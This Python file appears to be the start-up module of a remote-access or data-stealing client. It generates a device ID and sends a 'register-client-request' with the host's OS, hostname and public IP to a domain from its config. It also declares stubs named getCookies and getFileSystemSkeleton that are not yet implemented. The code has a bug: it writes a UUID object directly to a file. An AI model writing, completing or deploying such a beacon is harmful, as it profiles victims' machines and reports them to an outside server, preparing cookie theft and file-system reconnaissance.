import os
import platform
from helpers.helpers import *
from requestMethods.requestMethods import *
from config.config import config
import json
import uuid
import urllib

def getCookies():
	print('Getting cookies')


def createDeviceId():
	print('Creating device id')

	_id = uuid.uuid4()
	_file = open('id', 'w+')
	_file.write(_id)
	_file.close()

	return _id


def sendRegisterRequest(_deviceId):
	_data = {
		'client': json.dumps({
				'client_id': _deviceId,
				'os': platform.system() + " " + platform.version() + " " + os.name,
				'hostname': platform.node(),
				'ip': getPublicIp()
			}),
		'type': 'register-client-request'
	}

	_data = urllib.parse.urlencode(_data).encode("utf-8")
	
	sendRequest(config['domains'][0], _data)


def getFileSystemSkeleton():
	print('Getting file system skeleton')


def doStartStuff():
	print('Doing start stuff')

	if os.path.isfile('id'):
		return getFileContents('id')
	else:
		_deviceId = createDeviceId()
		getCookies()
		getFileSystemSkeleton()

		sendRegisterRequest(_deviceId)
		return _deviceId